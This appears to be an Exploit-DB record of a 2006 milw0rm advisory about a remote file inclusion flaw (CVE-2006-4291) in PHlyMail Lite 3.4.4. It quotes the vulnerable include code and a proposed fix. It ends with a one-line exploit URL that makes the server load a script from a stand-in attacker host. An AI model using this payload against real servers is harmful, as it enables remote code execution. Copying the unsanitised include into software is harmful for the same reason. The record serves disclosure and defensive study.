{
  "id": "2211",
  "title": "PHlyMail Lite 3.4.4 - &#039;mod.listmail.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-4291",
  "vuln_type": "unknown",
  "code": "/*\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n-   - - [DEVIL TEAM THE BEST POLISH TEAM] - -\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n- PHlyMail Lite <= 3.4.4 (Build 3.04.04) [_PM_[path][handler]] Remote File Include Vulnerability\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n- [Script name: PHlyMail Lite v. 3.4.4 (Build 3.04.04)\r\n- [Script site: http://phlymail.de/\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n-          Find by: Kacper (a.k.a Rahim)\r\n+\r\n-          Contact: kacper1964@yahoo.pl\r\n-                        or\r\n-          http://www.devilteam.yum.pl/\r\n-                       and\r\n-           http://www.rahim.webd.pl/\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n- Special Greetz: DragonHeart ;-)\r\n- Ema: Leito, Adam, DeathSpeed, Drzewko, pepi\r\n-\r\n!@ Przyjazni nie da sie zamienic na marne kozysci @!\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n-            Z Dedykacja dla osoby,\r\n-         bez ktorej nie mogl bym zyc...\r\n-           K.C:* J.M (a.k.a Magaja)\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n*/\r\n/*\r\n+++++++++++++++++++++START+++++++++++++++++++++++\r\nvulnerable code => handlers/email/mod.listmail.php line 12-25:\r\n....\r\n$use_preview = (isset($_PM_['core']['folders_usepreview']) && $_PM_['core']['folders_usepreview']) ? true : false;\r\n\r\n$ordfields = array\r\n       ('hfrom', 'hto', 'hcc', 'hbcc', 'hsubject', 'hdate_recv', 'hdate_sent', 'hsize', 'hpriority'\r\n       ,'attachments', 'meta_read', 'meta_type', 'meta_colour'\r\n       );\r\nrequire_once($_PM_['path']['handler'].'/'.$_REQUEST['handler'].'/fs.php');\r\nrequire_once($_PM_['path']['lib'].'/phm_streaming_mailparser.php');\r\n\r\n// We changed the folder, got to reset the page number to 0\r\nif (isset($_REQUEST['workfolder']) && isset($_SESSION['workfolder'])\r\n       && $_REQUEST['workfolder'] != $_SESSION['workfolder']) {\r\n   $_SESSION['WPs_pagenum'] = 0;\r\n}\r\n....\r\n+++++++++++++++++++++++++++++++++++++++++++++++++\r\n*/\r\n/*\r\n+++++++++++++++++++++FIX+++++++++++++++++++++++++\r\nhandlers/email/mod.listmail.php line 12-25:\r\nAdd Line1:\r\n....\r\nif (!defined('_IN_PHM_')) die();\r\n....\r\n$use_preview = (isset($_PM_['core']['folders_usepreview']) &&\r\n$_PM_['core']['folders_usepreview']) ? true : false;\r\n\r\n$ordfields = array\r\n       ('hfrom', 'hto', 'hcc', 'hbcc', 'hsubject', 'hdate_recv', 'hdate_sent', 'hsize', 'hpriority'\r\n       ,'attachments', 'meta_read', 'meta_type', 'meta_colour'\r\n       );\r\nrequire_once($_PM_['path']['handler'].'/'.$_REQUEST['handler'].'/fs.php');\r\nrequire_once($_PM_['path']['lib'].'/phm_streaming_mailparser.php');\r\n\r\n// We changed the folder, got to reset the page number to 0\r\nif (isset($_REQUEST['workfolder']) && isset($_SESSION['workfolder'])\r\n       && $_REQUEST['workfolder'] != $_SESSION['workfolder']) {\r\n   $_SESSION['WPs_pagenum'] = 0;\r\n}\r\n....\r\n++++++++++++++++++++THE+END++++++++++++++++++++++\r\n*/\r\n#Exploit:\r\n\r\nhttp://www.site.com/[phlymail_path]/handlers/email/mod.listmail.php?_PM_[path][handler]=[http://www.myevilsite.com/evil_scripts.txt]\r\n\r\n# milw0rm.com [2006-08-18]",
  "url": "https://www.exploit-db.com/exploits/2211"
}